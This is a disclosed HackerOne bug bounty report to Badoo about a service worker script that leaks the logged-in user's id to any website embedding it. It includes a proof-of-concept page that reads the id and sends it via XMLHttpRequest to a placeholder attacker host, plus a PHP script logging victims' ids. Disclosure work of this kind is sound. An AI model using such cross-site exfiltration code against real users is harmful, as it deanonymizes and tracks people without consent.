@@ -1,0 +1,89 @@
+ReportLink:https://hackerone.com/reports/139192
+WeaknessName:Information Disclosure
+Reporter:https://hackerone.com/saeedhashem
+ReportedTo:Badoo(badoo)
+BountyAmount:280.0
+Severity:
+State:Closed
+DateOfDisclosure:03.06.2016 12:53:34
+
+Summary:
+Despite this issue was reported in #130453 first, there was some misunderstanding. Reporter in #130453 was quite aggressive and unpleasant instead of describing in details what's wrong. Moreover, he wrote an article about this on [public resource]( https://www.seekurity.com/blog/general/badoo-hotornot-privacy-disclosure-feature-not-a-bug/).
+
+@saeedhashem on the other hand was quite kind and informative. That's why we decided to award this report with the bounty, not the first one.
+
+Guys please be informative and patient. We do value every single report to our program but there can be some misunderstandings because of huge amount of crap. 
+Please read our [rules](https://hackerone.com/badoo) carefully before submitting bugs.
+Hey ,
+
+Regarding this report #130453 , I'm pretty sure that there's a little misunderstanding of the issue , so please let me clarify the issue a bit more .
+
+The issue is not about the disclosure of user's id , that wouldn't be considered an issue at all because every website puts user's id in the user's profile usually , The issue here is the disclosure of badoo user who visited the webpage which contained the exploit code , that allows any site owner or advertisement campaign designer to exploit this issue maliciously by escalating a public and general ads campaign to a targeted ads campaign after collecting the users who were interested in the general campaign .  
+
+Let's clarify a bit further by some details and exploit scenario .
+
+###What made the vulnerability appear ?
+
+1. This script `https://badoo.com/worker-scope/chrome-service-worker.js?ws=1` being contained information dependent on the currently logged in user .
+2. This information can identify the currently logged in user.
+3. The same script being public , and can be called and fetched by any rogue script on any website  .
+
+
+###What makes it an issue ?
+
+It's considered as a privacy violation . If I visited some website , the website owner is not supposed to figure out my identity , but this issue allow him to do so .
+
+Additionally the issue allows any one to figure out weather I'm logged in or logged out , and by which account .
+
+###How can any one exploit the issue maliciously ? 
+
+Let's consider the following as an exploit scenario .
+
+I'm a commercial website owner who  found out about this issue and decided to take advantage to my new product advertisement campaign .
+
+So , I designed a plan as following :
+
+1. Start a public and general campaign by setting up the new product page in my website and distributing the link to the page every where , including badoo .
+2. The new product page should contain the Exploit code written below .
+
+```
+<html>
+<script src=https://badoo.com/worker-scope/chrome-service-worker.js?ws=1></script>
+</head>
+<body>
+<script>
+function UnmaskUser(str) {
+return str.split('=')[0];
+}
+window.onload = function(){
+var user = UnmaskUser(user_id);
+var xhr = new XMLHttpRequest();
+xhr.open('GET', 'http://MyfancyEvilWebsite.com/identity-stealer.php?victim=' user , true);
+xhr.send();
+};
+</script>
+</html>
+```
+And the `identity-stealer.php` should have the code :
+```
+<?php
+$user = $_GET['victim'];
+$fd = fopen("badoo-users-interested-in-my-product.txt","a");
+ fwrite($fd, $user);
+ fclose($fd);
+?>
+```
+
+3. The people who may be interested in my new product will start to visit my new product page .
+4. After a period of time I will be having a txt file `badoo-users-interested-in-my-product.txt` on my server with a list of ids of all badoo users who have visited my new product page while they are logged into badoo .
+5. Now I can start a more specific and targeted advertisement campaign by contacting those badoo users directly by private messages or emails .
+
+
+##Note : 
+This should be clarified the matter , so if you still think this issue isn't considered a security issue or privacy violation you can close the report as informative .
+
+
+Best regards , 
+Thanks ,
+
+Saeed H. 
